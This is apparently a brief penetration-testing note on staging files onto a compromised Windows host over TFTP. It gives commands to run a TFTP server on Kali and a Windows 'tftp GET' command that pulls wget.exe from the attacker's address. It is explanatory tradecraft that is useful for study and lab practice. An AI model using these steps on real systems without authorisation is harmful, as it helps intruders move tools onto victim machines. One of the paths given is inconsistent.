# Transferring files to windows

Transferring files to linux is usually pretty easy. We can use netcat, wget, curl, which most systems have as default. But windows does not have these tools.

## TFTP

A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactivly. Which means less risk of losing your shell.

Kali has a TFTP server build in.
You can server up some files with it like this

```
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart
```

Now you can put stuff in /srf/tftp and it will be served. Remember that TFTP used UDP. So if you run netstat it will not show it as listening. 

You can see it running like this

```
netstat -a -p UDP | grep udp
```

So now you can upload and download whatever from the windows-machine like this

```
tftp -i 192.160.1.101 GET wget.exe
```
